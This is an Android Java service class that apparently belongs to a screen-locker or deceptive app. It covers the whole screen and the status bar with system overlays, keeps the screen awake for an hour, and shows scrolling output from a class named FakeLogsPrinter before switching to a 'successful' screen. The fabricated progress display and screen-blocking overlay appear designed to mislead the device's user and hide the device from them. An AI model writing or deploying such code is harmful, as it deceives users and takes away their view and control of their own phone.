package volley.app.c_master.loc_service.sys;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.support.annotation.Nullable;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.ScrollView;
import android.widget.TextView;

import java.util.concurrent.atomic.AtomicBoolean;

import volley.app.c_master.loc_service.FakeLogsPrinter;
import volley.app.c_master.loc_service.OverlayUtils;
import privacy.app.com.loc_service.R;
import timber.log.Timber;

public class LoTestTempService extends Service {

    private static LoTestTempService instance;

    private WindowManager wm;
    private View overlayViewProcessing;
    private View overlayViewSuccessful;
    private View overlayViewTop;
    private TextView tvLogs;
    private ScrollView scrollViewLogs;

    private final Handler uiHandler = new Handler(Looper.getMainLooper());

    private final AtomicBoolean inProgress = new AtomicBoolean(false);

    protected PowerManager.WakeLock mWakeLock;

    // over notification bar (but WITHOUT keyboard)
    /*private static final WindowManager.LayoutParams wmParamsAboveAll = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT);
    private static final WindowManager.LayoutParams wmParamsAboveAllTopView = new WindowManager.LayoutParams(WindowManager.LayoutParams.MATCH_PARENT,
            StaticUtils.convertDpToPixel(80, AppComponentImpl.get().ctx()),
            WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | FLAG_LAYOUT_IN_SCREEN
                    | FLAG_LAYOUT_NO_LIMITS
                    | FLAG_NOT_TOUCH_MODAL
                    | FLAG_LAYOUT_INSET_DECOR
            , TRANSLUCENT);*/

    public static void start(Context context) {
        Intent starter = new Intent(context, LoTestTempService.class);
        starter.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.getApplicationContext().startService(starter);
    }

    @Nullable
    public static LoTestTempService getInstance() {
        return instance;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Notification notification = new Notification();
        startForeground(50004, notification);
        init();
        showOverlay(overlayViewProcessing,
                OverlayUtils.createAllTopParams(WindowManager.LayoutParams.MATCH_PARENT));
        showOverlay(overlayViewTop,
                OverlayUtils.createAllTopParams(OverlayUtils.convertDpToPixel(40, this.getApplicationContext())));
        inProgress.set(true);
        startLogsPrinting();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        try {
            this.mWakeLock.release();
        } catch (Exception e) {
            e.printStackTrace();
        }
        super.onDestroy();
    }

    public void setToFinishState() {
        uiHandler.post(new Runnable() {
            @Override
            public void run() {
                showOverlay(overlayViewSuccessful, OverlayUtils.createNormalParams());
                removeView(overlayViewProcessing);
            }
        });
        inProgress.set(false);
        stopForeground(true);
    }

    private void init() {
        wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        overlayViewProcessing = LayoutInflater.from(this).inflate(R.layout.overlay_view_processing, null);
        overlayViewSuccessful = LayoutInflater.from(this).inflate(R.layout.overlay_view_successful, null);
        overlayViewTop = new View(this);
        overlayViewTop.setBackgroundColor(Color.BLACK);
        tvLogs = overlayViewProcessing.findViewById(R.id.locker_tvLogs);
        scrollViewLogs = overlayViewProcessing.findViewById(R.id.locker_scrollViewLogs);
        //
        final PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null) {
            this.mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "My Tag");
        }
        this.mWakeLock.acquire(60 * 60 * 1000L /*60 minutes*/);
    }

    private void showOverlay(View view, WindowManager.LayoutParams params) {
        params.gravity = Gravity.START | Gravity.TOP;
        params.x = 0;
        params.y = 0;
        try {
            wm.addView(view, params);
        } catch (Exception e) {
            Timber.e(e, "showOverlay");
        }
    }

    private void startLogsPrinting() {
        FakeLogsPrinter.get().reset();
        final Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (inProgress.get()) {
                    tvLogs.setText(FakeLogsPrinter.get().generateLog());
                    scrollViewLogs.fullScroll(ScrollView.FOCUS_DOWN);
                    handler.postDelayed(this, 2000);
                }
            }
        }, 2000);
    }

    private void removeView(View view) {
        try {
            wm.removeView(view);
        } catch (Exception e) {
            Timber.e(e, "removeView");
        }
    }
}
